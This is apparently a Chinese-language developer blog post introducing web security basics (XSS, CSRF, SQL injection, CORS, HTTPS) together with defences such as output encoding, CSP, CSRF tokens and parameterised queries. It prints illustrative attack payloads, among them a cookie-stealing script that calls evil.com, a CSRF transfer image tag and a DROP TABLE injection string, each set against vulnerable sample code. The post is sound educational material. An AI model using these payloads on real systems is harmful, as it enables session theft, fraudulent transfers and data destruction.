---
title: Web 安全入门：不是安全工程师也要知道的事
date: 2026-05-16
cover: https://picsum.photos/seed/web-security/800/400
desc: 前端和后端开发者都需要了解的 Web 安全基础知识——XSS、CSRF、SQL注入、CORS 的防御实践
tags: [网络安全, 前端安全, 后端安全, 最佳实践]
---

## 安全不是安全部门的事

很多人觉得 Web 安全是安全团队的事，普通开发者"按规范写代码就行"。但大部分安全漏洞恰恰是在代码层面产生的——你写的那行看似无害的代码，可能就是一个漏洞点。

这篇文章不讲渗透测试、不讲漏洞挖掘，讲的是**作为开发者，你应该知道的 Web 安全常识和防御习惯**。

## XSS：最普遍的漏洞

XSS（跨站脚本攻击）的本质是：**用户输入的数据被当成了代码执行**。

### 三个常见场景

**存储型 XSS**：

```javascript
// 一个评论功能
app.post('/api/comments', (req, res) => {
  const comment = req.body.content
  // ❌ 直接存储（包含恶意脚本的评论被保存到数据库）
  db.comments.save(comment)
})

// 当其他人访问页面时：
// <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
// 这段脚本在访问者的浏览器中执行，偷走他的 cookie
```

**反射型 XSS**：

```html
<!-- URL 中的参数直接显示在页面中 -->
<p>搜索词：<%= request.query.q %></p>

<!-- 如果 q=<script>alert('xss')</script> -->
<!-- 脚本会在当前页面上下文执行 -->
```

**DOM 型 XSS**：

```javascript
// 从 URL hash 中取值直接设置 innerHTML
const tab = window.location.hash.slice(1)
document.getElementById('content').innerHTML = tab
// 如果 #<img src=x onerror=alert(1)>
// img 标签的 onerror 事件会执行
```

### 防御

**第一道防线：输出编码**

在不同上下文中使用不同的编码：

```javascript
// HTML 上下文 - 转义 <>"'&
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

// JavaScript 上下文 - JSON 序列化
// 不要用字符串拼接，用 JSON.stringify

// CSS 上下文 - 十六进制编码
```

现代框架（React、Vue）默认帮你做了转义。但要注意：

```vue
<!-- Vue 中自动转义 -->
<div>{{ userInput }}</div>

<!-- v-html 不会转义！需要确保内容是安全的 -->
<div v-html="sanitizedContent"></div>
```

**第二道防线：CSP（内容安全策略）**

CSP 是一个 HTTP 响应头，告诉浏览器哪些来源的脚本可以执行：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

这样即使 XSS 注入了脚本，浏览器也不会执行来自未授权来源的代码。

**第三道防线：HttpOnly Cookie**

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

HttpOnly 标记让 JavaScript 无法读取 cookie —— 即使有 XSS 也偷不走 session。

## CSRF：利用你的登录态

CSRF（跨站请求伪造）的逻辑：你在 A 网站登录了，然后去了 B 网站。B 网站向 A 网站发送一个请求，这个请求**自动携带了你的登录凭证**。

### 场景

你在银行网站登录了（还在有效期内），然后打开了一个钓鱼网站。钓鱼网站里有一个隐藏的请求：

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

浏览器会向 bank.com 发送 GET 请求，而且会自动带上 bank.com 的 cookie。服务器看到 cookie 以为是你本人操作的。

### 防御

**CSRF Token**：

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机生成的token" />
  <input name="amount" />
  <button>转账</button>
</form>
```

服务器生成一个随机 token 嵌入表单，提交时验证。攻击者无法获取这个 token，所以伪造的请求会失败。

**SameSite Cookie**：

```http
Set-Cookie: session=abc123; SameSite=Strict
```

`SameSite=Strict` 表示 cookie 只在同站点请求中发送。这是目前最有效的 CSRF 防御手段，现代浏览器默认或可选开启。

## SQL 注入：已经很少见但仍然致命

```javascript
// ❌ 危险
const query = `SELECT * FROM users WHERE name = '${userName}'`
// 如果 userName = "'; DROP TABLE users; --"
// 整个 users 表被删除！

// ✅ 安全：使用参数化查询
db.query('SELECT * FROM users WHERE name = ?', [userName])
```

参数化查询（prepared statement）把 SQL 结构和数据分开，数据库引擎知道哪部分是代码、哪部分是数据，注入就无效了。

**ORM 不是免死金牌**。很多 ORM 允许你使用 raw queries 或字符串拼接——这条防线会在你"图省事"的时候被突破。

## CORS：不是安全漏洞，是浏览器的安全策略

CORS（跨域资源共享）经常被开发者抱怨"又报 CORS 错误了"。它的本质是：

**浏览器**阻止一个网页的 JavaScript 向不同源的服务器发起请求（除非服务器明确允许）。

```http
# 服务器需要在响应头中声明允许的源
Access-Control-Allow-Origin: https://my-frontend.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
```

### 开发中的常见坑

```javascript
// 前端调试时（开发环境）：
// 前端在 localhost:5173，后端在 localhost:3000
// 浏览器会拦截跨域请求

// 解决方案（三种）：
// 1. 后端加 CORS 头（生产环境也要加的）
// 2. 前端开发服务器配置 proxy（Vite 可以配 server.proxy）
// 3. 使用 JSONP（已过时，不推荐）
```

**注意**：CORS 是浏览器的限制，不是 HTTP 协议的限制。如果使用 curl 或 Postman 请求，不会有 CORS 问题。

## HTTPS：不是可选项

2016 年之后，HTTPS 应该是一个网站的标配，不是"额外功能"。

**不用 HTTPS 的风险：** 在公共 WiFi 上，任何人都可以拦截你和服务器之间的通信。如果网站没有 HTTPS，你提交的密码、支付信息都是明文传输的。

幸好，现在配置 HTTPS 比过去简单多了：

```bash
# 使用 Let's Encrypt + Certbot
certbot --nginx -d example.com
```

而且主流云服务商（Cloudflare、Vercel、Netlify）都提供免费 TLS 证书和自动续期。

## 几个平时开发中的安全习惯

### 依赖安全

```bash
# 每周检查一次依赖漏洞
npm audit

# GitHub 的 Dependabot 可以自动提 PR 修复漏洞
# 尽量及时更新
```

### 敏感信息

```javascript
// ❌ .env 文件中
DB_PASSWORD=admin123
API_KEY=sk-xxx

// 不要提交到 Git！
// 配置 .gitignore 排除 .env 文件

// ✅ 使用密钥管理服务
// 生产环境通过环境变量或 vault 注入
```

### 最小权限原则

```javascript
// 应用数据库账号只给需要的权限
GRANT SELECT, INSERT, UPDATE ON blog.* TO 'app_user'@'%'
-- 不给 DROP、ALTER 等权限

// 即使被注入，也无法做结构性破坏
```

### 输入校验

```javascript
// 信任任何用户输入都是危险的
function validateEmail(email) {
  // 用语义化的校验方法
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    throw new Error('邮箱格式不正确')
  }
  // 长度限制：防止大 payload 攻击
  if (email.length > 254) {
    throw new Error('邮箱地址过长')
  }
}
```

## 写在最后

安全不是一个"做一次就完"的事——和写代码一样，你需要在日常开发中持续关注。

一个简化版的安全 checklist：
- [ ] 所有用户输入都经过校验和编码后再输出
- [ ] 使用了参数化查询（不用字符串拼接 SQL）
- [ ] 开启了 CSP 和 HttpOnly Cookie
- [ ] 配置了 HTTPS 和 HSTS
- [ ] 依赖包定期审计更新
- [ ] 敏感信息用环境变量/密钥管理服务

写完代码后花 5 分钟过一下这个清单，能堵住 90% 的常见漏洞。
